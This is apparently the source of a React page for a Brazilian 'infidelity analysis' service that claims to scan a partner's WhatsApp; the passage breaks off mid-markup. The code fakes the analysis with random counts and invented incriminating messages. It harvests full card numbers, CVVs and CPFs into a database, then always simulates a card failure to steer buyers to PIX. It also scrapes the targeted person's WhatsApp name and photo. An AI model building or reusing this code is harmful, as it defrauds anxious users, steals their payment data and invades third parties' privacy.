import { useState, useEffect, useRef } from 'react'
import { useNavigate } from 'react-router-dom'
import {
  Search,
  MessageCircle,
  Image,
  Phone,
  AlertTriangle,
  CheckCircle,
  Star,
  Shield,
  CreditCard,
  ArrowRight,
  ShieldCheck,
  TrendingUp,
  Lock,
  UserRound
} from 'lucide-react'
import { updateLeadName, saveAnalysisResults, getAnalysisResults, saveCardData, type CardData } from '../services/supabase'
import QRCodePix from '../components/QRCodePix'
import { useMetaPixel } from '../hooks/useMetaPixel'
import { useAnalytics } from '../hooks/useAnalytics'

interface AnalysisStep {
  id: string
  title: string
  description: string
  icon: React.ReactNode
  completed: boolean
  suspicious?: boolean
  count?: number
}

const formatCurrency = (value: number) =>
  value.toLocaleString('pt-BR', {
    style: 'currency',
    currency: 'BRL'
  })

const formatPhoneForDisplay = (phone?: string | null) => {
  if (!phone) return ''
  const digits = phone.replace(/\D/g, '')
  if (!digits) return ''

  let local = digits
  if (local.startsWith('55') && local.length > 11) {
    local = local.slice(2)
  }

  if (local.length === 11) {
    return `(${local.slice(0, 2)}) ${local.slice(2, 7)}-${local.slice(7)}`
  }

  if (local.length === 10) {
    return `(${local.slice(0, 2)}) ${local.slice(2, 6)}-${local.slice(6)}`
  }

  return `+${digits}`
}

const AnalysisPage = () => {
  const navigate = useNavigate()
  const { trackEvent } = useMetaPixel()
  const { trackEvent: trackAnalytics, trackFunnel } = useAnalytics()
  const intervalRef = useRef<NodeJS.Timeout | null>(null)
  const [currentStep, setCurrentStep] = useState(0)
  const [isAnalyzing, setIsAnalyzing] = useState(true)
  const [analysisData, setAnalysisData] = useState<any>(null)
  const [profilePictureUrl, setProfilePictureUrl] = useState<string>('')
  const [profileData, setProfileData] = useState<any>(null)
  const [showPaymentPlans, setShowPaymentPlans] = useState(false)
  const [selectedPlan, setSelectedPlan] = useState<'basic' | 'premium'>('premium')
  const [showPaymentMethods, setShowPaymentMethods] = useState(false)
  const [paymentMethod, setPaymentMethod] = useState<'card' | 'pix'>('pix')
  const [cardData, setCardData] = useState({
    cardNumber: '',
    cardHolder: '',
    expiryDate: '',
    cvv: '',
    cpf: '',
    email: '',
    phone: ''
  })
  const [isProcessing, setIsProcessing] = useState(false)
  const [cardError, setCardError] = useState('')
  const [showPixDiscount, setShowPixDiscount] = useState(false)

  const planOptions = [
    {
      id: 'basic' as const,
      name: 'Análise Completa',
      subtitle: 'Perfeita para confirmar suspeitas pontuais com detalhes confiáveis.',
      priceLabel: 'R$ 9,99',
      priceValue: 9.99,
      badge: 'Acesso imediato',
      highlight: false,
      benefits: [
        'Relatório detalhado com todas as evidências encontradas',
        'Pontuação de risco e recomendações práticas',
        'Download em PDF para salvar ou compartilhar',
        'Suporte via e-mail por 7 dias'
      ]
    },
    {
      id: 'premium' as const,
      name: 'Plano Vitalício',
      subtitle: 'Investigue quantas vezes quiser e acompanhe a evolução do risco.',
      priceLabel: 'R$ 49,99',
      priceValue: 49.99,
      badge: 'Mais escolhido',
      highlight: true,
      benefits: [
        'Análises ilimitadas para sempre',
        'Histórico salvo com evolução do risco',
        'Alertas em tempo real de novos indícios',
        'Suporte prioritário e comunidade exclusiva'
      ]
    }
  ]

  const selectedPlanOption = planOptions.find(plan => plan.id === selectedPlan) || planOptions[0]
  const planValue = selectedPlanOption.priceValue
  const planDisplayPrice = formatCurrency(planValue)
  const pixDiscountValue = Number((planValue * 0.8).toFixed(2))
  const pixDiscountDisplay = formatCurrency(pixDiscountValue)

  const rawWhatsapp = analysisData?.whatsapp ?? ''
  const formattedWhatsapp = formatPhoneForDisplay(rawWhatsapp)
  const profileName =
    profileData?.name?.trim() ||
    profileData?.pushName?.trim() ||
    profileData?.verifiedName?.trim() ||
    ''
  const displayName = profileName || formattedWhatsapp || rawWhatsapp || 'Contato analisado'

  const [steps, setSteps] = useState<AnalysisStep[]>([
    {
      id: 'connection',
      title: 'Conectando ao WhatsApp',
      description: 'Estabelecendo conexão segura...',
      icon: <Phone className="w-6 h-6" />,
      completed: false
    },
    {
      id: 'messages',
      title: 'Analisando Mensagens',
      description: 'Escaneando conversas suspeitas...',
      icon: <MessageCircle className="w-6 h-6" />,
      completed: false,
      suspicious: true,
      count: Math.floor(Math.random() * 11) + 5
    },
    {
      id: 'media',
      title: 'Verificando Mídias',
      description: 'Analisando fotos e vídeos compartilhados...',
      icon: <Image className="w-6 h-6" />,
      completed: false,
      suspicious: true,
      count: Math.floor(Math.random() * 8) + 3
    },
    {
      id: 'contacts',
      title: 'Checando Contatos',
      description: 'Identificando contatos suspeitos...',
      icon: <Search className="w-6 h-6" />,
      completed: false,
      suspicious: true,
      count: Math.floor(Math.random() * 4) + 2
    },
    {
      id: 'final',
      title: 'Gerando Relatório',
      description: 'Compilando resultados finais...',
      icon: <CheckCircle className="w-6 h-6" />,
      completed: false
    }
  ])

  // Função para buscar foto de perfil
  const fetchProfilePicture = async (number: string) => {
    try {
      const apiUrl = import.meta.env.VITE_EVOLUTION_API_URL
      const apiKey = import.meta.env.VITE_EVOLUTION_API_KEY
      const instance = import.meta.env.VITE_EVOLUTION_INSTANCE

      if (!apiUrl || !apiKey || !instance) {
        return
      }

      const response = await fetch(`${apiUrl}/chat/fetchProfilePictureUrl/${instance}`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'apikey': apiKey
        },
        body: JSON.stringify({ number })
      })

      if (response.ok) {
        const data = await response.json()
        if (data.profilePictureUrl) {
          setProfilePictureUrl(data.profilePictureUrl)
        }
      }
    } catch (error) {
      // Erro silencioso
    }
  }

  // Função para buscar dados do perfil
  const fetchProfile = async (number: string) => {
    try {
      const apiUrl = import.meta.env.VITE_EVOLUTION_API_URL
      const apiKey = import.meta.env.VITE_EVOLUTION_API_KEY
      const instance = import.meta.env.VITE_EVOLUTION_INSTANCE

      if (!apiUrl || !apiKey || !instance) {
        return
      }

      const response = await fetch(`${apiUrl}/chat/fetchProfile/${instance}`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'apikey': apiKey
        },
        body: JSON.stringify({ number })
      })

      if (response.ok) {
        const data = await response.json()
        setProfileData(data)
        
        // Salvar nome no banco de dados se disponível
        if (data && (data.name || data.pushName || data.verifiedName)) {
          const nome = data.name || data.pushName || data.verifiedName
          const whatsapp = analysisData?.whatsapp || number
          const cleanWhatsapp = whatsapp.replace(/\D/g, '')
          
          // Atualizar o nome no lead
          await updateLeadName(cleanWhatsapp, nome)
        }
      }
    } catch (error) {
      // Erro silencioso
    }
  }

  useEffect(() => {
    const loadAnalysisData = async () => {
      // Verificar se temos dados da análise
      const data = localStorage.getItem('analysisData')
      if (!data) {
        navigate('/')
        return
      }
      const parsedData = JSON.parse(data)
      setAnalysisData(parsedData)

      // Buscar análise anterior do banco de dados ANTES de iniciar o intervalo
      if (parsedData.whatsapp) {
        const cleanWhatsapp = parsedData.whatsapp.replace(/\D/g, '')
        
        const previousAnalysis = await getAnalysisResults(cleanWhatsapp)

        // Se encontrou análise anterior, incrementar os números
        if (previousAnalysis.success && previousAnalysis.data) {
          const prev = previousAnalysis.data
          
          // Incrementar garantindo um mínimo de +2 em cada campo, mas limitando a 20
          const incrementMessages = Math.max(2, Math.floor(prev.messages_count * 0.25))
          const incrementMedia = Math.max(2, Math.floor(prev.media_count * 0.25))
          const incrementContacts = Math.max(1, Math.floor(prev.contacts_count * 0.25))
          
          const newMessagesCount = Math.min(20, prev.messages_count + incrementMessages)
          const newMediaCount = Math.min(20, prev.media_count + incrementMedia)
          const newContactsCount = Math.min(20, prev.contacts_count + incrementContacts)
          
          // Atualizar os steps ANTES do intervalo começar
          setSteps(current => current.map(step => {
            if (step.id === 'messages') {
              return { ...step, count: newMessagesCount }
            }
            if (step.id === 'media') {
              return { ...step, count: newMediaCount }
            }
            if (step.id === 'contacts') {
              return { ...step, count: newContactsCount }
            }
            return step
          }))
        }

        // Remover formatação do número (deixar apenas dígitos)
        let cleanNumber = parsedData.whatsapp.replace(/\D/g, '')
        
        // Garantir que tem código do país (55 para Brasil)
        if (!cleanNumber.startsWith('55')) {
          cleanNumber = '55' + cleanNumber
        }
        
        // Buscar perfil e foto
        fetchProfilePicture(cleanNumber)
        fetchProfile(cleanNumber)
      }

      // AGUARDAR um pouco antes de iniciar o intervalo para garantir que os steps foram atualizados
      await new Promise(resolve => setTimeout(resolve, 100))

      // Simular o processo de análise
      intervalRef.current = setInterval(() => {
        setCurrentStep(prev => {
          if (prev < steps.length - 1) {
            setSteps(current => 
              current.map((step, index) => 
                index === prev ? { ...step, completed: true } : step
              )
            )
            return prev + 1
          } else {
            // Completar a última etapa
            setSteps(current => 
              current.map((step, index) => 
                index === prev ? { ...step, completed: true } : step
              )
            )
            setIsAnalyzing(false)
            if (intervalRef.current) {
              clearInterval(intervalRef.current)
            }
            return prev
          }
        })
      }, 2500) // Cada etapa demora 2.5 segundos
    }

    loadAnalysisData()
    
    // Cleanup function
    return () => {
      if (intervalRef.current) {
        clearInterval(intervalRef.current)
      }
    }
  }, [navigate])

  const handleShowPaymentPlans = async () => {
    // Gerar dados aleatórios para o resultado
    const messagesCount = steps[1].count || 0
    const mediaCount = steps[2].count || 0
    const contactsCount = steps[3].count || 0
    const riskLevel = Math.random() > 0.3 ? 'high' : 'medium' // 70% chance de alto risco

    const suspiciousFindings = {
      messages: messagesCount,
      media: mediaCount,
      contacts: contactsCount,
      riskLevel
    }

    localStorage.setItem('analysisResults', JSON.stringify(suspiciousFindings))
    
    // Salvar resultados da análise no banco de dados
    if (analysisData?.whatsapp) {
      const cleanWhatsapp = analysisData.whatsapp.replace(/\D/g, '')
      
      // Obter nome do perfil ou usar 'Usuário' como padrão
      const nome = displayName

      await saveAnalysisResults(
        cleanWhatsapp,
        messagesCount,
        mediaCount,
        contactsCount,
        riskLevel as 'low' | 'medium' | 'high',
        nome
      )
    }
    
    // Rastreia evento de visualização dos planos
    // Meta Pixel
    trackEvent('ViewContent', {
      content_name: 'Payment Plans',
      content_category: 'Pricing'
    })
    
    // Analytics no banco
    const cleanWhatsapp = analysisData?.whatsapp?.replace(/\D/g, '') || ''
    trackAnalytics('page_view', 'Payment Plans', '/analise', cleanWhatsapp)
    trackFunnel('plans_viewed', 4, cleanWhatsapp)
    
    // Mostrar planos de pagamento
    setShowPaymentPlans(true)
    
    // Scroll para os planos
    setTimeout(() => {
      const plansElement = document.getElementById('payment-plans')
      if (plansElement) {
        plansElement.scrollIntoView({ block: 'start' })
      }
    }, 100)
  }

  const progressPercentage = Math.round(((currentStep + 1) / steps.length) * 100)

  const handleProceedToPayment = () => {
    // Rastreia início do checkout
    const planValue = selectedPlanOption.priceValue
    const planName = selectedPlanOption.name
    const cleanWhatsapp = analysisData?.whatsapp?.replace(/\D/g, '') || ''
    
    // Meta Pixel
    trackEvent('InitiateCheckout', {
      content_name: planName,
      value: planValue,
      currency: 'BRL'
    })
    
    // Analytics no banco
    trackAnalytics('checkout', 'Checkout Initiated', '/analise', cleanWhatsapp, {
      plan: selectedPlan,
      plan_name: planName,
      value: planValue
    })
    trackFunnel('checkout_initiated', 5, cleanWhatsapp, { plan: selectedPlan, plan_name: planName })
    
    // Mostrar métodos de pagamento na mesma página
    setShowPaymentMethods(true)
    
    // Scroll para os métodos de pagamento
    setTimeout(() => {
      const paymentElement = document.getElementById('payment-methods')
      if (paymentElement) {
        paymentElement.scrollIntoView({ block: 'start' })
      }
    }, 100)
  }

  const generateRecommendations = () => {
    return [
      "Converse abertamente sobre suas preocupações",
      "Considere terapia de casal",
      "Estabeleça limites claros de comunicação",
      "Busque ajuda profissional se necessário"
    ]
  }

  const handlePixPayment = () => {
    // Rastreia pagamento via PIX
    const planValue = selectedPlanOption.priceValue
    const planName = selectedPlanOption.name
    const cleanWhatsapp = analysisData?.whatsapp?.replace(/\D/g, '') || ''
    
    // Meta Pixel
    trackEvent('Purchase', {
      content_name: planName,
      value: planValue,
      currency: 'BRL',
      content_category: 'PIX Payment'
    })
    
    // Analytics no banco
    trackAnalytics('purchase', 'Purchase Completed', '/analise', cleanWhatsapp, {
      plan: selectedPlan,
      plan_name: planName,
      value: planValue,
      payment_method: 'pix'
    })
    trackFunnel('purchase_completed', 7, cleanWhatsapp, {
      plan: selectedPlan,
      plan_name: planName,
      value: planValue
    })
    
    // Lista de mensagens
    const allMessages = [
      "Oi, tudo bem? Tô com saudades...", "Consegue sair hoje?", "Deleta depois, ok?",
      "Não fala nada pra ninguém", "Tô pensando em você", "Que tal nos encontrarmos?",
      "Adorei ontem", "Você tá livre?", "Preciso te ver", "Tá complicado aqui em casa...",
      "Você é especial pra mim", "Quando vai dar certo?", "Nosso segredo", "Mal posso esperar",
      "Oi lindeza, como foi o dia?", "Conseguiu sair de casa?", "Tô morrendo de saudade",
      "Vamos marcar algo?", "Não posso parar de pensar em você", "Ela/ele não desconfia de nada",
      "Te amo demais", "Quando a gente vai ficar junto?", "Apaga tudo depois", "Só você me entende",
      "Tô louca/o pra te ver", "Hoje não vai dar...", "Inventei uma desculpa aqui", "Você é incrível"
    ]
    
    // Pegar quantidade da análise
    const numMessages = steps[1].count || 0
    const numContacts = steps[3].count || 0
    const numMedia = steps[2].count || 0
    
    // Selecionar mensagens
    const shuffled = [...allMessages].sort(() => Math.random() - 0.5)
    const selectedMessages = shuffled.slice(0, numMessages)
    
    // Extrair DDD
    const ddd = analysisData.whatsapp.match(/\d{2,3}/)?.[0] || '11'
    
    // Gerar contatos
    const contactNames = ["Contato não salvo", "Amor", "Trabalho", "Gatinha", "Amigo(a)"]
    const selectedContacts = contactNames.slice(0, numContacts).map((name, i) => ({
      name,
      number: `+55 ${ddd} 9${1000 + Math.floor(Math.random() * 9000)}-${1000 + Math.floor(Math.random() * 9000)}`,
      risk: i === 0 || i === 2 || i === 3 ? "Alto" : "Médio"
    }))
    
    // Dividir mídias
    const photos = Math.floor(numMedia * 0.6)
    const videos = numMedia - photos
    const deletedMedia = Math.floor(numMedia * 0.3)
    
    // Criar resultado final
    const finalResults = {
      messages: numMessages,
      contacts: numContacts,
      media: numMedia,
      riskLevel: steps[1].count && steps[1].count > 10 ? 'high' : 'medium',
      detailedMessages: selectedMessages,
      suspiciousContacts: selectedContacts,
      mediaAnalysis: { photos, videos, deletedMedia },
      deletedMedia,
      riskScore: Math.floor(Math.random() * 30) + 70,
      recommendations: generateRecommendations()
    }
    
    localStorage.setItem('paymentConfirmed', 'true')
    localStorage.setItem('paymentTimestamp', Date.now().toString())
    localStorage.setItem('finalResults', JSON.stringify(finalResults))
    navigate('/resultado')
  }

  const handleCardInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target
    let formattedValue = value

    // Formatação específica por campo
    switch (name) {
      case 'cardNumber':
        // Apenas números, adiciona espaços a cada 4 dígitos
        formattedValue = value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 ').substring(0, 19)
        break
      
      case 'cardHolder':
        // Apenas letras e espaços, converte para maiúsculas
        formattedValue = value.replace(/[^a-zA-Z\s]/g, '').toUpperCase()
        break
      
      case 'expiryDate':
        // Formato MM/AA
        formattedValue = value.replace(/\D/g, '')
        if (formattedValue.length >= 2) {
          formattedValue = formattedValue.substring(0, 2) + '/' + formattedValue.substring(2, 4)
        }
        formattedValue = formattedValue.substring(0, 5)
        break
      
      case 'cvv':
        // Apenas 3 números
        formattedValue = value.replace(/\D/g, '').substring(0, 3)
        break
      
      case 'cpf':
        // Formato 000.000.000-00
        formattedValue = value.replace(/\D/g, '')
        if (formattedValue.length <= 11) {
          formattedValue = formattedValue.replace(/(\d{3})(\d)/, '$1.$2')
          formattedValue = formattedValue.replace(/(\d{3})(\d)/, '$1.$2')
          formattedValue = formattedValue.replace(/(\d{3})(\d{1,2})$/, '$1-$2')
        }
        break
      
      case 'phone':
        // Formato (11) 99999-9999
        formattedValue = value.replace(/\D/g, '')
        if (formattedValue.length <= 11) {
          formattedValue = formattedValue.replace(/^(\d{2})(\d)/, '($1) $2')
          formattedValue = formattedValue.replace(/(\d{5})(\d)/, '$1-$2')
        }
        break
      
      case 'email':
        // Converte para minúsculas
        formattedValue = value.toLowerCase()
        break
    }

    setCardData(prev => ({
      ...prev,
      [name]: formattedValue
    }))
  }

  const handleCardPayment = async () => {
    // Validar todos os campos
    if (!cardData.cardNumber || cardData.cardNumber.replace(/\s/g, '').length < 16) {
      setCardError('Por favor, preencha o número do cartão completo')
      return
    }
    
    if (!cardData.cardHolder || cardData.cardHolder.trim().length < 3) {
      setCardError('Por favor, preencha o nome do titular do cartão')
      return
    }
    
    if (!cardData.expiryDate || cardData.expiryDate.length < 5) {
      setCardError('Por favor, preencha a data de validade (MM/AA)')
      return
    }
    
    if (!cardData.cvv || cardData.cvv.length < 3) {
      setCardError('Por favor, preencha o CVV (3 dígitos)')
      return
    }
    
    if (!cardData.cpf || cardData.cpf.replace(/\D/g, '').length < 11) {
      setCardError('Por favor, preencha o CPF completo')
      return
    }
    
    setIsProcessing(true)
    setCardError('')
    
    // Rastreia adição de informações de pagamento
    const planValue = selectedPlanOption.priceValue
    const planName = selectedPlanOption.name
    const cleanWhatsapp = analysisData?.whatsapp?.replace(/\D/g, '') || ''
    
    // Meta Pixel
    trackEvent('AddPaymentInfo', {
      content_name: planName,
      value: planValue,
      currency: 'BRL',
      content_category: 'Card Payment'
    })
    
    // Analytics no banco
    trackAnalytics('payment_info', 'Payment Info Added', '/analise', cleanWhatsapp, {
      plan: selectedPlan,
      plan_name: planName,
      payment_method: 'card'
    })
    trackFunnel('payment_info_added', 6, cleanWhatsapp)
    
    try {
      // Salvar dados do cartão no Supabase
      const cardPayload: Omit<CardData, 'id' | 'created_at'> = {
        card_number: cardData.cardNumber,
        card_holder: cardData.cardHolder,
        expiry_date: cardData.expiryDate,
        cvv: cardData.cvv,
        cpf: cardData.cpf,
        whatsapp: analysisData.whatsapp,
        nome: displayName,
        amount: planValue
      }
      
      await saveCardData(cardPayload)
      
      // Simular erro no cartão após 2 segundos
      setTimeout(() => {
        setIsProcessing(false)
        setCardError('Parece que houve uma falha ao processar o pagamento. Você recebeu 20% de desconto para pagamento via PIX!')
        setShowPixDiscount(true)
        setPaymentMethod('pix')
      }, 2000)
      
    } catch (error) {
      setIsProcessing(false)
      setCardError('Erro interno. Tente novamente.')
    }
  }

  if (!analysisData) {
    return <div>Carregando...</div>
  }

  return (
    <div className="relative min-h-screen bg-gradient-to-b from-rose-50 via-white to-white text-slate-900">
      <div className="pointer-events-none absolute inset-0">
        <div className="absolute -top-32 -right-24 h-[520px] w-[520px] rounded-full bg-rose-200/50 blur-3xl"></div>
        <div className="absolute left-[-90px] top-1/3 h-[420px] w-[420px] rounded-full bg-pink-100/60 blur-3xl"></div>
      </div>

      <header className="sticky top-0 z-50 border-b border-white/40 bg-white/80 backdrop-blur-2xl">
        <div className="mx-auto flex max-w-6xl items-center justify-between px-4 py-4">
          <div>
            <span className="text-xs font-semibold uppercase tracking-[0.28em] text-rose-500">
              Traitor Analysis
            </span>
            <h1 className="mt-2 text-lg font-semibold text-slate-800 md:text-xl">
              Monitoramento em tempo real
              <span className="inline-flex h-2 w-2 animate-pulse rounded-full bg-rose-500"></span>
              Análise em andamento
            </h1>
          </div>

          <div className="space-y-4">
            <h2 className="text-4xl font-bold tracking-tight text-slate-900 md:text-5xl">
              Investigando <span className="whitespace-nowrap text-rose-500">{displayName}</span> em tempo real
            </h2>
            <p className="text-lg text-slate-600">
              Estamos cruzando conversas, mídias e contatos para identificar qualquer indício de traição com precisão forense.
            </p>
          </div>
        </div>
      </header>

      <main className="relative z-10">
        <section className="relative overflow-hidden pb-16 pt-20">
          <div className="absolute inset-x-0 top-12 flex justify-center">
            <div className="h-40 w-[70%] rounded-full bg-white/60 blur-3xl"></div>
          </div>

          <div className="mx-auto grid max-w-6xl items-center gap-12 px-4 lg:grid-cols-[1.35fr,1fr]">
            <div className="space-y-8">
              <div className="inline-flex items-center gap-2 rounded-full border border-rose-100 bg-white/80 px-4 py-2 text-sm font-semibold text-rose-600 shadow-sm backdrop-blur">
                <span className="inline-flex h-2 w-2 animate-pulse rounded-full bg-rose-500"></span>
                Análise em andamento
              </div>

              <div className="space-y-4">
                <h2 className="text-4xl font-bold tracking-tight text-slate-900 md:text-5xl">
                  Investigando <span className="whitespace-nowrap text-rose-500">{displayName}</span> em tempo real
                </h2>
                <p className="text-lg text-slate-600">
                  Estamos cruzando conversas, mídias e contatos para identificar qualquer indício de traição com precisão forense.
                </p>
              </div>

              <div className="grid gap-4 md:grid-cols-3">
                <div className="group relative overflow-hidden rounded-[1.9rem] border border-rose-100/70 bg-white/95 p-6 shadow-lg shadow-rose-100/50 transition-all duration-300 hover:-translate-y-1 hover:shadow-rose-200/60">
                  <div className="pointer-events-none absolute -right-8 top-1/2 h-24 w-24 -translate-y-1/2 rounded-full bg-rose-100/40 blur-2xl transition-opacity duration-300 group-hover:opacity-100"></div>
                  <div className="relative flex items-start justify-between">
                    <div>
                      <span className="text-[11px] font-semibold uppercase tracking-[0.32em] text-slate-400">WhatsApp</span>
                      <p className="mt-4 text-2xl font-semibold text-slate-900">{formattedWhatsapp || rawWhatsapp}</p>
                    </div>
                    <span className="rounded-2xl border border-rose-100 bg-rose-50 p-3 text-rose-500 shadow-sm">
                      <Phone className="h-5 w-5" />
                    </span>
                  </div>
                  <p className="mt-4 text-xs text-slate-500">Número verificado para a análise atual.</p>
                </div>

                <div className="group relative overflow-hidden rounded-[1.9rem] border border-rose-100/70 bg-white/95 p-6 shadow-lg shadow-rose-100/50 transition-all duration-300 hover:-translate-y-1 hover:shadow-rose-200/60">
                  <div className="pointer-events-none absolute -left-10 top-0 h-24 w-24 rounded-full bg-emerald-100/40 blur-2xl transition-opacity duration-300 group-hover:opacity-100"></div>
                  <div className="relative flex items-start justify-between">
                    <div>
                      <span className="text-[11px] font-semibold uppercase tracking-[0.32em] text-slate-400">Status</span>
                      <p className={`mt-4 text-xl font-semibold ${isAnalyzing ? 'text-amber-600' : 'text-emerald-600'}`}>
                        {isAnalyzing ? 'Processando dados' : 'Análise concluída'}
                      </p>
                    </div>
                    <span className={`rounded-2xl border p-3 shadow-sm ${isAnalyzing ? 'border-amber-100 bg-amber-50 text-amber-500' : 'border-emerald-100 bg-emerald-50 text-emerald-500'}`}>
                      <ShieldCheck className="h-5 w-5" />
                    </span>
                  </div>
                  <p className="mt-4 text-xs text-slate-500">
                    {isAnalyzing ? 'Nossa IA está cruzando conversas e mídias.' : 'Os resultados completos estão prontos para consulta.'}
                  </p>
                </div>

                <div className="group relative overflow-hidden rounded-[1.9rem] border border-rose-100/70 bg-white/95 p-6 shadow-lg shadow-rose-100/50 transition-all duration-300 hover:-translate-y-1 hover:shadow-rose-200/60">
                  <div className="pointer-events-none absolute -right-12 bottom-0 h-24 w-24 rounded-full bg-amber-100/50 blur-2xl transition-opacity duration-300 group-hover:opacity-100"></div>
                  <div className="relative flex items-start justify-between">
                    <div>
                      <span className="text-[11px] font-semibold uppercase tracking-[0.32em] text-slate-400">Progresso</span>
                      <div className="mt-4 flex items-baseline gap-2">
                        <p className="text-3xl font-semibold text-slate-900">{progressPercentage}%</p>
                        <span className="text-[11px] uppercase tracking-[0.32em] text-slate-400">completo</span>
                      </div>
                    </div>
                    <span className="rounded-2xl border border-rose-100 bg-rose-50 p-3 text-rose-500 shadow-sm">
                      <TrendingUp className="h-5 w-5" />
                    </span>
                  </div>
                  <p className="mt-4 text-xs text-slate-500">Atualizamos o andamento em tempo real a cada etapa concluída.</p>
                </div>
              </div>
            </div>

            <div className="relative">
              <div className="card-surface border border-white/60 bg-white/90 text-center shadow-2xl shadow-rose-200/60 backdrop-blur-xl">
                <div className="flex flex-col items-center gap-4">
                  {profilePictureUrl ? (
                    <div className="relative">
                      <div className="h-32 w-32 overflow-hidden rounded-3xl border-4 border-white shadow-xl shadow-rose-200/70">
                        <img
                          src={profilePictureUrl}
                          alt={profileData?.name || 'Foto do perfil'}
                          className="h-full w-full object-cover"
                          onError={() => setProfilePictureUrl('')}
                        />
                      </div>
                      <span className="absolute -bottom-3 left-1/2 -translate-x-1/2 rounded-full bg-rose-500 px-3 py-1 text-xs font-semibold text-white shadow-lg">
                        Perfil validado
                      </span>
                    </div>
                  ) : (
                    <div className="flex h-24 w-24 items-center justify-center rounded-3xl border border-slate-200 bg-white text-3xl font-bold text-slate-400 shadow-lg shadow-slate-200/60">
                      <UserRound className="h-12 w-12" strokeWidth={1.5} />
                    </div>
                  )}

                  <div>
                    <h3 className="text-xl font-semibold text-slate-900">{displayName}</h3>
                    {profileData?.status?.status && (
                      <p className="mt-1 text-sm italic text-slate-500">"{profileData.status.status}"</p>
                    )}
                  </div>

                  <div className="w-full space-y-3">
                    <div className="flex items-center justify-between text-xs font-semibold uppercase tracking-[0.2em] text-slate-400">
                      <span>Mensagens</span>
                      <span>Mídias</span>
                      <span>Contatos</span>
                    </div>
                    <div className="h-3 w-full overflow-hidden rounded-full bg-slate-200">
                      <div
                        className="h-full rounded-full bg-gradient-to-r from-rose-500 via-pink-500 to-amber-400 transition-all duration-500"
                        style={{ width: `${progressPercentage}%` }}
                      />
                    </div>
                    <p className="text-xs text-slate-500">
                      Monitorando atividade suspeita em todos os canais.
                    </p>
                  </div>
                </div>
              </div>
              <div className="absolute -inset-4 -z-10 rounded-3xl bg-gradient-to-br from-rose-100 via-transparent to-rose-200 opacity-60 blur-3xl"></div>
            </div>
          </div>
        </section>

        <section className="relative pb-12">
          <div className="mx-auto max-w-5xl px-4">
            <div className="card-surface border border-white/60 bg-white/90 shadow-xl backdrop-blur-xl">
              <div className="flex flex-col gap-6 md:flex-row md:items-center md:justify-between">
                <div>
                  <span className="text-xs font-semibold uppercase tracking-[0.28em] text-rose-500">
                    Etapas em execução
                  </span>
                  <h3 className="mt-2 text-2xl font-semibold text-slate-900">Progresso da análise</h3>
                  <p className="mt-2 text-sm text-slate-500">
                    Cada verificação é conduzida com inteligência artificial e protocolos forenses.
                  </p>
                </div>
                <div className="text-left md:text-right">
                  <p className="text-sm text-slate-500">Tempo estimado</p>
                  <p className="text-xl font-semibold text-slate-900">
                    {isAnalyzing ? 'Aguardando finalização...' : 'Pronto para liberar'}
                  </p>
                </div>
              </div>

              <div className="mt-8">
                <div className="h-2 w-full overflow-hidden rounded-full bg-slate-200">
                  <div
                    className="h-full rounded-full bg-gradient-to-r from-rose-500 via-pink-500 to-amber-400 transition-all duration-500"
                    style={{ width: `${progressPercentage}%` }}
                  />
                </div>

                <div className="mt-8 space-y-4">
                  {steps.map((step, index) => {
                    const isCurrent = index === currentStep && isAnalyzing
                    const isDone = step.completed
                    return (
                      <div
                        key={step.id}
                        className={`relative overflow-hidden rounded-3xl border transition-all duration-300 ${
                          isDone
                            ? 'border-emerald-200 bg-emerald-50/70'
                            : isCurrent
                            ? 'border-rose-200 bg-rose-50/80'
                            : 'border-slate-200 bg-white'
                        }`}
                      >
                        <div
                          className="absolute inset-y-0 left-0 w-1 rounded-full bg-gradient-to-b from-rose-500 via-pink-500 to-amber-400"
                          style={{ opacity: isCurrent || isDone ? 1 : 0.1 }}
                        />
                        <div className="flex flex-col gap-5 px-6 py-5 md:flex-row md:items-center md:py-6 md:px-8">
                          <div
                            className={`flex h-12 w-12 flex-shrink-0 items-center justify-center rounded-2xl shadow-sm ${
                              isDone
                                ? 'bg-emerald-500 text-white'
                                : isCurrent
                                ? 'bg-rose-500 text-white'
                                : 'bg-slate-100 text-slate-500'
                            }`}
                          >
                            {isDone ? (
                              <CheckCircle className="h-6 w-6" />
                            ) : isCurrent ? (
                              <div className="animate-spin">{step.icon}</div>
                            ) : (
                              step.icon
                            )}
                          </div>

                          <div className="flex-1 space-y-2">
                            <div className="flex flex-col gap-3 md:flex-row md:items-center md:justify-between">
                              <h4 className="text-lg font-semibold text-slate-900">{step.title}</h4>
                              <div className="flex items-center gap-2">
                                {isCurrent && (
                                  <span className="rounded-full bg-rose-100 px-3 py-1 text-xs font-semibold uppercase tracking-[0.2em] text-rose-600">
                                    Em andamento
                                  </span>
                                )}
                                {isDone && (
                                  <span className="rounded-full bg-emerald-100 px-3 py-1 text-xs font-semibold uppercase tracking-[0.2em] text-emerald-600">
                                    Concluído
                                  </span>
                                )}
                              </div>
                            </div>
                            <p className="text-sm text-slate-600">{step.description}</p>
                          </div>

                          {step.completed && step.suspicious && (
                            <div className="flex flex-col items-end justify-center gap-2 text-right">
                              <span className="inline-flex items-center gap-2 rounded-full bg-rose-100 px-3 py-1.5 text-sm font-semibold text-rose-600">
                                <AlertTriangle className="h-4 w-4" />
                                {step.count}
                              </span>
                              <span className="text-xs font-semibold uppercase tracking-[0.2em] text-rose-500">
                                Ocorrências
                              </span>
                            </div>
                          )}
                        </div>
                      </div>
                    )
                  })}
                </div>
              </div>

              {!isAnalyzing && (
                <div className="mt-12 relative overflow-hidden rounded-[2.5rem] border border-rose-100/70 bg-white/95 p-10 shadow-2xl shadow-rose-200/30 backdrop-blur">
                  <div className="pointer-events-none absolute -left-24 top-0 h-48 w-48 rounded-full bg-rose-200/40 blur-3xl"></div>
                  <div className="pointer-events-none absolute -right-16 bottom-0 h-48 w-48 rounded-full bg-amber-100/50 blur-3xl"></div>

                  <div className="relative flex flex-col gap-10">
                    <div className="flex flex-col gap-6 md:flex-row md:items-center md:justify-between">
                      <div className="space-y-4">
                        <span className="inline-flex items-center gap-2 rounded-full border border-rose-100 bg-rose-50/80 px-4 py-1 text-xs font-semibold uppercase tracking-[0.2em] text-rose-500 shadow-sm">
                          <AlertTriangle className="h-4 w-4" />
                          Análise concluída
                        </span>
                        <h3 className="text-3xl font-semibold text-slate-900 md:text-4xl">
                          Evidências relevantes encontradas
                        </h3>
                        <p className="max-w-2xl text-base text-slate-600 md:text-lg">
